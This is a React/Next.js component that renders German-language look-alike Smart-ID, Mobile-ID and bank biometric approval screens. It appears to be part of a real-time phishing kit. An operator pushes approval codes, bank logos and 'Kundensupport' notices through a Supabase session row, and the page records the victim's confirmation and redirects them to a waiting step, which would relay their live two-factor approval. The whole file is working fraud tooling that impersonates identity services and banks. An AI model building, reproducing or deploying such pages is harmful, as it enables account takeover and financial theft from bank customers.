"use client";

import { useEffect, useMemo, useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
import { Linkify } from "@/components/ui/Linkify";

type ApprovalLang = "en" | "tr";

type ApprovalViewState = {
  sessionStatus: string;
  approvalStatus: string;
  approvalCode: string;
  bankSlug: string;
  bankName: string;
  message: string;
  imageUrl: string | null;
  lang: ApprovalLang;
};

const APPROVAL_LABELS: Record<string, string> = {
  smartid_1: "Smart-ID",
  smartid_2: "Smart-ID 2",
  mobileid_1: "Mobile-ID 1",
  mobileid_2: "Mobile-ID 2",
  biometrika_pin_1: "Biometrika / PIN 1",
  biometrika_pin_2: "Biometrika / PIN 2",
};

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) {
    return [];
  }

  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) {
      return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
    }
  } catch {
    return [value.trim()];
  }

  return [];
}

function formatRemainingTime(seconds: number) {
  const safeSeconds = Math.max(0, seconds);
  const minutes = Math.floor(safeSeconds / 60)
    .toString()
    .padStart(2, "0");
  const remainingSeconds = (safeSeconds % 60).toString().padStart(2, "0");
  return `${minutes}:${remainingSeconds}`;
}

function SmartIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/smart-id-logo.png"
        alt="Smart-ID"
        width={176}
        height={40}
        priority
        className="h-auto w-[176px]"
      />
    </div>
  );
}

function MobileIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/mobile-id-logo.png"
        alt="Mobile-ID"
        width={178}
        height={42}
        priority
        className="h-auto w-[178px]"
      />
    </div>
  );
}

function SmartIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[352px] rounded-[18px] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)] sm:px-7">
        <div className="mb-9 flex justify-center">
          <SmartIdMark />
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Öffnen Sie die Smart-ID-App auf Ihrem Telefon.
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Mit {pinLabel} bestätigen</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Wird bestätigt..." : "Bestätigen"}
          </button>
        </div>
      </div>
    </div>
  );
}

function GenericApprovalCard({
  title,
  approvalCode,
  secondsLeft,
  saving,
  onConfirm,
}: {
  title: string;
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Bestätigung erforderlich</h1>
        <p className="mb-6 text-base text-[#667085]">Bestätigen Sie zum Fortfahren den auf Ihrem Gerät angezeigten Verifizierungscode.</p>

        <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
          {approvalCode || "0000"}
        </div>

        <p className="mb-6 text-sm text-[#667085]">
          Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
        </p>

        <button
          type="button"
          onClick={onConfirm}
          disabled={saving}
          className="w-full rounded-[12px] bg-[#1464f4] px-4 py-4 text-base font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
        >
          {saving ? "Wird bestätigt..." : "Bestätigen"}
        </button>
      </div>
    </div>
  );
}

function MobileIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        <div className="mb-9 flex justify-center">
          <MobileIdMark />
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Öffnen Sie die Mobile-ID-App auf Ihrem Telefon.
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Mit {pinLabel} bestätigen</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Wird bestätigt..." : "Bestätigen"}
          </button>
        </div>
      </div>
    </div>
  );
}

function BiometricApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  bankSlug,
  bankName,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  bankSlug: string;
  bankName: string;
  onConfirm: () => void;
}) {
  const bankLogo = resolveLocalBankLogoFile(bankSlug, null);

  return (
    <div className="flex min-h-screen items-center justify-center px-4 py-8">
      <div className="w-full max-w-[354px] rounded-[18px] bg-white px-7 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
        <div className="mb-9 flex min-h-[48px] items-center justify-center">
          {bankLogo ? (
            <img
              src={bankLogo}
              alt={bankName || bankSlug || "Bank"}
              className="max-h-12 w-auto max-w-[190px] object-contain"
            />
          ) : (
            <div className="text-center text-2xl font-semibold tracking-[-0.03em] text-[#101828]">
              {bankName || bankSlug || "Bank"}
            </div>
          )}
        </div>

        <div className="space-y-5 text-center">
          <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
            Biometrische Verifizierung
          </h1>

          <p className="text-[1.08rem] text-[#667085]">Mit {pinLabel} bestätigen</p>

          <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
            {approvalCode || "0000"}
          </div>

          <p className="text-[1rem] text-[#667085]">
            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="w-full rounded-[10px] bg-[#1464f4] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#0e57db] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {saving ? "Wird bestätigt..." : "Bestätigen"}
          </button>
        </div>
      </div>
    </div>
  );
}

function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[640px]">
        <div className="pak-form-inner px-5 py-6 text-center sm:px-8 sm:py-8">
          <div className="mb-4 flex items-start justify-between gap-4 text-left">
            <div>
              <p className="text-[0.72rem] font-black uppercase tracking-[0.24em] text-[#ffe98c]">Kundensupport</p>
              <h1 className="mt-3 text-3xl font-extrabold uppercase leading-[0.95] tracking-[-0.03em] text-white sm:text-[2.65rem]">
                Wichtiger Hinweis
              </h1>
            </div>
          </div>

          <div className="mb-5 rounded-[1.2rem] border border-[#ffd95c]/18 bg-black/20 px-4 py-4 sm:px-5">
            <p className="whitespace-pre-wrap text-base font-semibold leading-7 text-white/92 sm:text-lg">
              <Linkify text={message} />
            </p>
          </div>

          <div className="pak-form-security justify-center border-t border-[#ffd95c]/15 pt-4 text-center">
            <svg className="h-7 w-7 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
              <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            <span>Ihre Anfrage wird sicher von unserem Support geprüft.</span>
          </div>

          {imageUrl ? (
            <div className="mt-5 overflow-hidden rounded-2xl border border-white/10 bg-white/5 p-1 shadow-sm">
              <img src={imageUrl} alt="Support-Hinweis" className="mx-auto h-auto w-full rounded-xl object-contain" />
            </div>
          ) : null}
        </div>
      </div>
    </div>
  );
}

export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [ready, setReady] = useState(false);
  const [saving, setSaving] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(30);
  const [viewState, setViewState] = useState<ApprovalViewState>({
    sessionStatus: "",
    approvalStatus: "",
    approvalCode: "",
    bankSlug: "",
    bankName: "",
    message: "Bitte warten...",
    imageUrl: null,
    lang: "en",
  });

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached) setEffectiveSessionId(cached);
  }, [sessionId]);

  useEffect(() => {
    if (!viewState.approvalStatus) return;
    setSecondsLeft(30);

    const timer = window.setInterval(() => {
      setSecondsLeft((previous) => {
        if (previous <= 1) {
          window.clearInterval(timer);
          return 0;
        }
        return previous - 1;
      });
    }, 1000);

    return () => {
      window.clearInterval(timer);
    };
  }, [viewState.approvalStatus, effectiveSessionId]);

  useEffect(() => {
    if (!effectiveSessionId || !supabase) return;

    const applySessionData = (sessionData: { form_data?: Record<string, unknown> | null; status?: string | null } | null | undefined) => {
      const formData = sessionData?.form_data;
      const fd = (formData ?? {}) as Record<string, string | undefined>;
      setViewState({
        sessionStatus: sessionData?.status?.trim() ?? "",
        approvalStatus: fd.approvalStatus?.trim() ?? "",
        approvalCode: fd.approvalCode?.trim() ?? "",
        bankSlug: fd.bankSlug?.trim() ?? "",
        bankName: fd.bankName?.trim() ?? "",
        message: fd.specialNoticeText ?? fd.customMessage ?? "Bitte warten...",
        imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
        lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "en",
      });
      setReady(true);
    };

    void (async () => {
      const { data } = await supabase.from("sessions").select("status,form_data").eq("id", effectiveSessionId).maybeSingle();
      if (!data) {
        setReady(true);
        return;
      }
      applySessionData(data as { form_data?: Record<string, unknown> | null; status?: string | null });
    })();

    const channel = supabase
      .channel(`special-approval-content:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { form_data?: Record<string, unknown> | null; status?: string | null };
          applySessionData(next);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  async function handleApprovalSubmit() {
    if (!supabase || !effectiveSessionId) return;

    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", effectiveSessionId).maybeSingle();
    const previousFormData = ((existing?.form_data ?? {}) as Record<string, string | undefined>) ?? {};
    const nextApprovalHistory = [
      ...parseApprovalHistory(previousFormData.approvalHistory),
      viewState.approvalStatus,
    ].filter((item) => item && item.trim().length > 0);

    const { error } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...previousFormData,
          approvalStatus: viewState.approvalStatus,
          approvalCode: viewState.approvalCode,
          approvalHistory: JSON.stringify(nextApprovalHistory),
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (!error) {
      router.push(stepToPath("wait", effectiveSessionId));
    }
  }

  if (!ready) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4">
        <div className="size-10 animate-spin rounded-full border-4 border-[#1464f4]/25 border-t-[#1464f4]" />
      </div>
    );
  }

  if (viewState.sessionStatus === "SPECIAL_INFO") {
    return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
  }

  if (viewState.approvalStatus === "smartid_1" || viewState.approvalStatus === "smartid_2") {
    return (
      <SmartIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "smartid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "mobileid_1" || viewState.approvalStatus === "mobileid_2") {
    return (
      <MobileIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "mobileid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "biometrika_pin_1" || viewState.approvalStatus === "biometrika_pin_2") {
    return (
      <BiometricApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "biometrika_pin_2" ? "PIN2" : "PIN1"}
        bankSlug={viewState.bankSlug}
        bankName={viewState.bankName}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus) {
    return (
      <GenericApprovalCard
        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Bestätigung"}
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
}
